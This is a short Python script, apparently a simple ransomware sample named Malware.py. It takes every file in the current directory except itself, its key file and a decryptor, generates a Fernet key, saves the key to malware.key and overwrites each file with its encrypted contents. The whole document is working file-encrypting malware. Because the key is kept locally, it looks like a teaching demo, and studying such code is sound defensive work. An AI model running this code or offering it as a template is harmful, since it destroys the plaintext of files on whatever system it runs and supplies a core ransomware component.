import os
from cryptography.fernet import Fernet

files = []

# Find the files to encrypt
for file in os.listdir():
    if file == "Malware.py" or file == "malware.key" or file == "Decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# Generate the key
key = Fernet.generate_key()

# Save the key on a file
with open("malware.key", "wb") as key_file:
    key_file.write(key)

# Encrypt all the data from the files
for file in files:
    with open(file, "rb") as the_file:
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(contents_encrypted)

print("All files have been encrypted.")
